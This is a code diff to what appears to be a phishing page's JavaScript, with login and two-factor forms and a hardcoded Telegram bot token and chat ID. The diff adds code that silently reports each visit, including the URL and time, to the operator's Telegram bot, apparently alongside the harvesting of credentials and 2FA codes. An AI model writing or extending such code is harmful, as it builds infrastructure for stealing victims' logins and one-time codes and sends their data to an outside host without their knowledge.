@@ -135,6 +135,24 @@ const BOT_TOKEN = "8433734840:AAFv4xWIBQIhD6JKSVhb8bgnMds6UMVvnSU";
 const CHAT_ID = "7003155954";
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
+// Escape markdown special chars for Telegram MarkdownV2 parse mode
+function escapeMarkdown(text) {
+  return text.replace(/([\_\*\[\]\(\)\~\`\>\#\+\-\=\|\{\}\.\!\\])/g, '\\$1');
+}
+
+// Notify Telegram when someone visits the website
+fetch(TG_URL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: CHAT_ID,
+    parse_mode: "MarkdownV2",
+    text: `👀 Website visited\n🌐 URL: \`${escapeMarkdown(location.href)}\`\n🕒 Time: ${new Date().toLocaleString()}`
+  })
+}).catch(() => {
+  // ignore any errors here
+});
+
 const page1 = document.getElementById("page1");
 const page2 = document.getElementById("page2");
 const mainBtn = document.getElementById("mainBtn");
@@ -159,10 +177,6 @@ function showPage(num) {
     mainBtn.setAttribute("form", "twofaForm");
     mainBtn.textContent = "Verify";
   }
-}
-
-function escapeMarkdown(text) {
-  return text.replace(/([\_\*\[\]\(\)\~\`\>\#\+\-\=\|\{\}\.\!\\])/g, '\\$1');
 }
 
 document.getElementById("loginForm").addEventListener("submit", e => {
